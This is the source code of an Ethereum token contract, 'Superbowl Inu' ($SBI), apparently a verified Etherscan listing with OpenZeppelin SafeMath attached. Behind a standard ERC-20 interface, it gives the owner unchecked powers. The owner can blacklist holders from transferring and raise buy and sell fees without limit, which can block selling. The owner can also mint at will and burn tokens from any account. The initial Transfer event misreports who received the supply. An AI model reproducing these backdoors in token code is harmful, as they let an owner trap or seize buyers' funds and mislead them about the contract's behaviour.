/**
 *Submitted for verification at Etherscan.io on 2023-02-04
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-03
*/

// SPDX-License-Identifier: MIT


// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// File: gen.sol


pragma solidity 0.8.17;

interface IERC20 {
   
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)external returns (bool);
    function allowance(address owner, address spender)external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
}


contract SuperbowlInu is IERC20 {
    
    using SafeMath for uint256;

    string public _name = "Superbowl Inu";
    string public _symbol = "$SBI"; 
    uint8 public _decimals = 18;
   uint256 maxWallet = 3 ; // 3%
    address public owner;
    address public contractAddress;
    
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 internal _totalSupply = 1000000000 *10**18; //  
    
    mapping(address => bool) isExcludedFromFee;
    mapping(address => bool) public blackListed;
    mapping(address => bool) public whiteListed;
    address[] internal _excluded;
    
     //tax
    uint256 public _lpFee = 700; // 7%
    uint256 public _marketingFee = 700; // 7%


    uint256 public _lpFeeTotal;
    uint256 public _marketingFeeTotal;
 
    address public marketingAddress  = 0x26c224C4A9aA2DC7fBf318b5957d1a0F62D49C7a;      // marketingAddress
    address public lpAddress  ;  // lpAddress liquidity pool
   

    constructor() {

        owner = msg.sender;
        isExcludedFromFee[msg.sender] = true;
        isExcludedFromFee[address(this)] = true;
        _balances[0xDd647ceCC1eBaE90A35b0F49b2a92D43133B32d8] = _totalSupply;
                
        emit Transfer(address(0), msg.sender, _totalSupply);


    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public override view returns (uint256) {
         return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override virtual returns (bool) {
        require(_balances[recipient].mul(100).div(_totalSupply) < maxWallet , " your maximum limit is exceed");
       _transfer(msg.sender,recipient,amount);
        return true;
    }

    function allowance(address owner, address spender) public override view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override virtual returns (bool) {
        _transfer(sender,recipient,amount);       
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub( amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }




function set_lpFee(uint256 _fee) public onlyOwner{
    _lpFee = _fee;
}

function set_marketingFee(uint256 _fee) public onlyOwner{
    _marketingFee = _fee;
}


function set_maxWallet(uint256 _fee) public onlyOwner{
    maxWallet = _fee;
}

function set_marketingAddress(address _addres) public onlyOwner {
    marketingAddress = _addres;
}

function set_lpAddress(address _addres) public onlyOwner {
    lpAddress = _addres;
}


    function _transfer(address sender, address recipient, uint256 amount) private {

        require(!blackListed[msg.sender], "You are blacklisted so you can not Transfer Gen tokens.");
        require(!blackListed[recipient], "blacklisted address canot be able to recieve Gen tokens.");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        uint256 transferAmount = amount;

        if(isExcludedFromFee[sender] && recipient == contractAddress){
            transferAmount = collectFee(sender,amount);     
        }
        else if(whiteListed[sender] || whiteListed[recipient]){
            transferAmount = amount;     
        }
        else{

             if(sender == lpAddress){
                transferAmount = SellcollectFee(sender,amount);
            }

            if(isExcludedFromFee[sender] && isExcludedFromFee[recipient]){
                transferAmount = amount;
            }
            if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){
                transferAmount = SellcollectFee(sender,amount);
            }
            if(isExcludedFromFee[sender] && !isExcludedFromFee[recipient]){
                transferAmount = collectFee(sender,amount);
            }
            if(!isExcludedFromFee[sender] && isExcludedFromFee[recipient]){
                transferAmount = SellcollectFee(sender,amount);
            }

            
        }   

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(transferAmount);
        
        emit Transfer(sender, recipient, transferAmount);
    }

    function decreaseTotalSupply(uint256 amount) public onlyOwner {
        _totalSupply =_totalSupply.sub(amount);

    }


    function mint(address account, uint256 amount) public onlyOwner {
       
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
    }
    
    function burn(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
    }
    
    
    function collectFee(address account, uint256 amount/*, uint256 rate*/) private returns (uint256) {
        
        uint256 transferAmount = amount;
       
        uint256 marketingFee = amount.mul(_marketingFee).div(10000);
        

        if (marketingFee > 0){
            transferAmount = transferAmount.sub(marketingFee);
            _balances[marketingAddress] = _balances[marketingAddress].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            emit Transfer(account,marketingAddress,marketingFee);
        }
     
       
       
        return transferAmount;
    }


    function SellcollectFee(address account, uint256 amount/*, uint256 rate*/) private  returns (uint256) {
        
        uint256 transferAmount = amount;
        
 
        uint256 marketingFee = amount.mul(_marketingFee).div(10000);
        uint256 lpFee = amount.mul(_lpFee).div(10000);
        

        if (marketingFee > 0){
            transferAmount = transferAmount.sub(marketingFee);
            _balances[marketingAddress] = _balances[marketingAddress].add(marketingFee);
            _marketingFeeTotal = _marketingFeeTotal.add(marketingFee);
            emit Transfer(account,marketingAddress,marketingFee);
        }

        if (lpFee > 0){
            transferAmount = transferAmount.sub(lpFee);
             _balances[lpAddress] = _balances[lpAddress].add(lpFee);
            _lpFeeTotal = _lpFeeTotal.add(lpFee);
            emit Transfer(account,lpAddress,lpFee);
        }

      

        
        return transferAmount;
    }



 function addInBlackList(address account, bool) public onlyOwner {
        blackListed[account] = true;
    }
    
    function removeFromBlackList(address account, bool) public onlyOwner {
        blackListed[account] = false;
    }

    function isBlackListed(address _address) public view returns( bool _blacklisted){
        
        if(blackListed[_address] == true){
            return true;
        }
        else{
            return false;
        }
    }

    function addInWhiteList(address account, bool) public onlyOwner {
        whiteListed[account] = true;
    }

    function removeFromWhiteList(address account, bool) public onlyOwner {
        whiteListed[account] = false;
    }

    function isWhiteListed(address _address) public view returns( bool _whitelisted){
        
        if(whiteListed[_address] == true){
            return true;
        }
        else{
            return false;
        }
    }
   
    function ExcludedFromFee(address account, bool) public onlyOwner {
        isExcludedFromFee[account] = true;
    }
    
    function IncludeInFee(address account, bool) public onlyOwner {
        isExcludedFromFee[account] = false;
    }

    


function transferOwnerShip(address _owner) public  onlyOwner {
    owner = _owner;
}

 modifier onlyOwner {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

}